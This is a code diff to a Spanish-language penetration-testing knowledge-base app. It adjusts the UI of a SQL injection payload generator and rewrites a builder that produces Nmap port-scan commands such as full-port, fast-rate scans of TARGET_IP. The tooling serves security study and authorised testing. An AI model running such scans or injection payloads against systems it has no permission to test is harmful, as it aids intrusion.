@@ -5244,12 +5374,8 @@ function openWebVuln(id){
             <option value="oracle">Oracle</option>
           </select>
         </div>
-        <div class="enum-gen-row" style="align-items:flex-start;">
-          <span class="enum-gen-label">Objetivo</span>
-          <div id="sqliCatBtns" class="enum-toggle-row" style="margin:0;"></div>
-        </div>
         <div class="enum-note" style="margin-top:8px;">⚠ Payloads orientativos: la sintaxis exacta (sobre todo el blind en MSSQL/PostgreSQL/Oracle) depende del contexto de la inyección. En MySQL suelen ir directos; en el resto, ajústala si hace falta.</div>
-        <div id="sqliGenOut" style="margin-top:8px;"></div>
+        <div id="sqliGenOut" style="margin-top:10px;"></div>
       </div></div>`;
   }
 
@@ -5285,7 +5411,7 @@ function openWebVuln(id){
 
   d.innerHTML=html;
   const sc=document.getElementById('webvulnScroll'); if(sc) sc.scrollTop=0;
-  if(v.generator){ _sqliCat='detect'; renderSqliGen(); }
+  if(v.generator){ resetSqliGen(); }
 }
 
 // ─── DICTIONARIES & POLYGLOTS ─────────────────────────────────────────────────
@@ -5337,34 +5463,6 @@ function openDictModal(){
   document.getElementById('dictBody').innerHTML=html;
   document.getElementById('dictModal').classList.add('show');
   const _dm=document.querySelector('#dictModal .modal'); if(_dm) _dm.scrollTop=0;
-}
-
-async function saveNmapResult(btn){
-  const ip=(document.getElementById('nmapIP').value||'TARGET_IP').trim();
-  const cmd1=document.getElementById('nmapCmd1').textContent.trim();
-  const cmd2raw=document.getElementById('nmapCmd2').textContent.trim();
-  const cmd2=cmd2raw.startsWith('Introduce')?null:cmd2raw;
-  const now=new Date().toISOString().slice(0,10);
-  const content=`## Escaneo Nmap — ${ip}  \nFecha: ${now}\n\n### Fase 1 — Descubrimiento de puertos\n\`\`\`\n${cmd1}\n\`\`\`\n\n${cmd2?`### Fase 2 — Análisis en profundidad\n\`\`\`\n${cmd2}\n\`\`\`\n\n`:''}\n> Generado desde el módulo Enumeración de CyberKB`;
-  const orig=btn.textContent;
-  btn.textContent='⟳ Guardando...';btn.disabled=true;
-  try{
-    const res=await API.post('/api/notes',{
-      title:`Nmap — ${ip} — ${now}`,
-      content,
-      category:'tecnica',
-      subcategory:'enumeracion',
-      tags:['nmap','enumeracion',ip]
-    });
-    btn.textContent='✓ Nota creada';
-    btn.style.color='var(--green)';btn.style.borderColor='var(--green)';
-    await loadAll();
-    setStatus('Nota Nmap creada — ID #'+res.id);
-    setTimeout(()=>{btn.textContent=orig;btn.disabled=false;btn.style.color='';btn.style.borderColor='';},2500);
-  }catch(e){
-    btn.textContent=orig;btn.disabled=false;
-    setStatus('Error creando nota: '+e.message,'error');
-  }
 }
 
 function switchEnumTab(name){
@@ -5461,7 +5559,7 @@ function toggleEnumAcc(hd){
 }
 
 // Network discovery command generator
-const _ENUM_FLAGS={pn:false,v:false,sV:true,sC:true,O:false,A:false,oN:false};
+const _ENUM_FLAGS={p:false,minrate:false,pn:false,v:false,sV:true,sC:true,O:false,A:false,oN:false};
 function toggleEnumFlag(flag){
   _ENUM_FLAGS[flag]=!_ENUM_FLAGS[flag];
   document.getElementById('tgl-'+flag).classList.toggle('active',_ENUM_FLAGS[flag]);
@@ -5552,13 +5650,16 @@ function onSvcPortsChanged(){
 
 function buildNmapCmd(){
   const ip=(document.getElementById('nmapIP').value||'TARGET_IP').trim();
-  const rate=document.getElementById('nmapSpeed').value;
+  const timing=document.getElementById('nmapSpeed').value;   // -T2 / -T3 / -T4
   const ports=(document.getElementById('nmapPorts').value||'').trim();
 
-  // Phase 1
-  let cmd1='sudo nmap -p- --min-rate '+rate;
-  if(_ENUM_FLAGS.pn) cmd1+=' -Pn';
-  if(_ENUM_FLAGS.v)  cmd1+=' -v';
+  // Phase 1 — velocidad con -T; -p- y --min-rate son toggles opcionales (como -Pn/-v)
+  let cmd1='sudo nmap';
+  if(_ENUM_FLAGS.p)       cmd1+=' -p-';
+  if(timing && timing!=='-T3') cmd1+=' '+timing;   // -T3 es el default de nmap → no hace falta ponerlo
+  if(_ENUM_FLAGS.minrate) cmd1+=' --min-rate 5000';
+  if(_ENUM_FLAGS.pn)      cmd1+=' -Pn';
+  if(_ENUM_FLAGS.v)       cmd1+=' -v';
   cmd1+=' '+ip;
   document.getElementById('nmapCmd1').textContent=cmd1;
 
